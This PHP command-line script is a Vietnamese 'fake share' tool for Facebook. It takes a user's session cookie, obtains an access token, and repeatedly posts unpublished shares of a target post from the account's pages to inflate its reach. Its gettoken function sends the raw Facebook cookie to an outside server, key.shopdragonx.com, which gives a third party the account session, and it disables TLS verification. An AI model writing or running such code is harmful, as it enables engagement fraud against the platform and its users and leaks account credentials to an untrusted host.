<?php
error_reporting(0);
session_start();
date_default_timezone_set("Asia/Ho_Chi_Minh");
$do="\033[1;91m";
$den="\033[1;33m";
$tim="\033[1;34m";
$luc="\033[1;92m";
$trang="\033[1;97m";
$vang = "\033[1;93m";
$hong = "\033[1;95m";
$xnhac = "\033[1;36m";
$xduong = "\033[1;96m";
/*** [ Copyright © 2023 DragonX ] ***/
$dragonx = $do."[".$trang ."=.=".$do."] ".$trang."=> ";
/***[ Banner ]***/
$banner = "
\033[1;34m  █████╗ ███╗   ██╗     ██████╗ ██████╗ ██╗███╗   ██╗
\033[1;37m ██╔══██╗████╗  ██║    ██╔═══██╗██╔══██╗██║████╗  ██║
\033[1;34m ███████║██╔██╗ ██║    ██║   ██║██████╔╝██║██╔██╗ ██║
\033[1;37m ██╔══██║██║╚██╗██║    ██║   ██║██╔══██╗██║██║╚██╗██║
\033[1;34m ██║  ██║██║ ╚████║    ╚██████╔╝██║  ██║██║██║ ╚████║
\033[1;37m ╚═╝  ╚═╝╚═╝  ╚═══╝     ╚═════╝ ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
\033[1;31m────────────────────────────────────────────────────────────
\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;33mTOOL SHARE ẢO ĐA PRO5 
\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;35mADMIN: \033[1;36mAN ORIN
\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;36mFB: \033[1;31manorintool970
\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mBOX SUPPORT: \033[1;37mhttps://zalo.me/g/dpfbxq529
\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;34mYOUTUBE: \033[1;37mhttps://youtube.com/@AnOrinTool970
\033[1;31m────────────────────────────────────────────────────────────\n";
@system('clear');
/***[ Clear + Thông Số Admin ]***/
if (strtoupper(substr(PHP_OS, 0, 3)) === 'LIN') { 
    @system('clear'); 
} else { 
    @system('cls'); 
}
for($i = 0; $i < strlen($banner); $i++){echo $banner[$i];usleep(500);}
echo $dragonx.$luc."Nhập Cookie Facebook : \033[1;33m";
$cookie = trim(fgets(STDIN));
$token = gettoken($cookie);
if ($token == 'die'){
   exit($dragonx.$do."Cookie Die!!");
}
echo $dragonx.$luc."Nhập ID Bài viết : \033[1;33m";
$id_post = trim(fgets(STDIN));
$get1 = req('https://graph.facebook.com/me/accounts?access_token=' . $token, $cookie);
$json_get = json_decode($get1, true);
$stt = 0;
echo "\033[1;31m────────────────────────────────────────────────────────────\n";
foreach ($json_get["data"] as $get) {
    $stt++;
    echo $dragonx.$do."[".$vang.$stt.$do."] ".$luc."Page : ".$vang.$get['name'].$trang." | ".$luc."ID : ".$vang.$get['id']."\n";
}
echo "\033[1;31m────────────────────────────────────────────────────────────\n";
echo $dragonx.$do."[".$vang."Lưu Ý".$do."]"." Chỉ Chọn Page Profile \n";
echo $dragonx . $luc . "Nhập số ví dụ (" . $trang . "1+2+3" . $luc . ")\n";
echo $dragonx . $luc . "Nhập Số Page Để Chạy Nhiệm Vụ: $vang";
$chon_page = trim(fgets(STDIN));
$chon_page_arr = explode('+', $chon_page); 
$kho_token_page = [];
foreach ($json_get["data"] as $index => $get) {
    if (in_array($index + 1, $chon_page_arr)) { 
        $token_page = array($get['name'],$get['id'],$get['access_token']);
        array_push($kho_token_page, $token_page);
    }
}
echo $dragonx.$luc."Chạy Bao Nhiêu Share Thì Đổi Page : \033[1;33m";
$dung_doi_page = trim(fgets(STDIN));
echo $dragonx.$luc."Chạy Bao Nhiêu Share Thì Dừng : \033[1;33m";
$dung = trim(fgets(STDIN));
@system('clear');
/***[ Clear + Thông Số Admin ]***/
if (strtoupper(substr(PHP_OS, 0, 3)) === 'LIN') { 
    @system('clear'); 
} else { 
    @system('cls'); 
}
for($i = 0; $i < strlen($banner); $i++){echo $banner[$i];usleep(500);}
echo $dragonx.$luc."Tìm Thấy : \033[1;33m".count($kho_token_page)." Page Profile\n";
echo "\033[1;31m────────────────────────────────────────────────────────────\n";
echo $dragonx.$luc."Tên Page : ".$vang.$kho_token_page[0][0]."\n";
echo $dragonx.$luc."ID Page : ".$vang.$kho_token_page[0][1]."\n";
echo "\033[1;31m────────────────────────────────────────────────────────────\n";
$tt = 0;
while(true){
for ($x = 0; $x < count($kho_token_page); $x++) {
$tokenpage = $kho_token_page[$x][2];
$share = sharepro5($id_post, $tokenpage, $cookie);
$id_s = $share["id"] ;
if (!$id_s){
	echo $dragonx.$do." Share Thất Bại ! Kiểm Tra Lại Page : ".$vang.$kho_token_page[$x][0].$do." Hoặc ID Bài Viết \n";
	array_splice($kho_token_page, $x, 1);
} else {
$gio = date("H:i");
$tt++;
echo "".$do." | ".$tim.$tt.$do." | ".$luc.$gio.$do." | ".$trang."SHARE".$do." | ".$vang.$id_s.$do." | \n";
if ($tt % $dung_doi_page == 0) {
array_splice($kho_token_page, $x, 1);
if (count($kho_token_page) < 1){
    echo "\033[1;31m────────────────────────────────────────────────────────────\n";
    echo $dragonx . $do . "Toàn Bộ Page Bạn Chọn Đã Hết !!\n";
    echo $dragonx."Share Thành Công Tổng : $tt Share\n";
    echo $dragonx.$xnhac."Cảm ơn Bạn Đã Sử Dụng Tool By DragonX\n";
    echo $dragonx.$xnhac."Có Gì Thắc Mắc Hay Muốn Đề Xuất Gì Thì Bảo Quản Trị Viên Trong Box Zalo Nhé . Cảm Ơn Bạn Rất Nhiều!\n";
    echo "\033[1;31m────────────────────────────────────────────────────────────\n";
    exit;
} else {
echo "\033[1;31m────────────────────────────────────────────────────────────\n";
echo $dragonx.$luc."Tên Page : ".$vang.$kho_token_page[$x][0]."\n";
echo $dragonx.$luc."ID Page : ".$vang.$kho_token_page[$x][1]."\n";
echo "\033[1;31m────────────────────────────────────────────────────────────\n";
}
}
if ( $tt == $dung ){
    echo "\033[1;31m────────────────────────────────────────────────────────────\n";
	echo $dragonx."Share Thành Công Tổng : $tt Share\n";
    echo $dragonx.$xnhac."Cảm ơn Bạn Đã Sử Dụng Tool By DragonX\n";
    echo $dragonx.$xnhac."Có Gì Thắc Mắc Hay Muốn Đề Xuất Gì Thì Bảo Quản Trị Viên Trong Box Zalo Nhé . Cảm Ơn Bạn Rất Nhiều!\n";
    echo "\033[1;31m────────────────────────────────────────────────────────────\n";
	exit;
}
}
}

}




function sharepro5($id_post, $tokenpage, $cookie){

$url = req("https://graph.facebook.com/me/feed?method=POST&link=https://m.facebook.com/" . $id_post . "&published=0&access_token=" . $tokenpage, $cookie);

$js = json_decode($url,true);
   return $js;
}
function gettoken($cookie) {
    $getck = file_get_contents("https://key.shopdragonx.com/apiv2/func.php?get_token=EAAG&cookie=".$cookie);
    return $getck;
}
function req($url, $cookie)
{
    $ch   = curl_init();
    curl_setopt_array(
        $ch,
        array(
            CURLOPT_URL => $url,
            CURLOPT_CUSTOMREQUEST => "GET",
            CURLOPT_FOLLOWLOCATION => TRUE,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_SSL_VERIFYPEER => 0,
            CURLOPT_HTTPHEADER =>
            array(
                "Cookie:" . $cookie,
            ),
            CURLOPT_SSL_VERIFYPEER => FALSE,
            CURLOPT_ENCODING => TRUE,
        )
    );
    $ch = curl_exec($ch);
    return $ch;
}
?>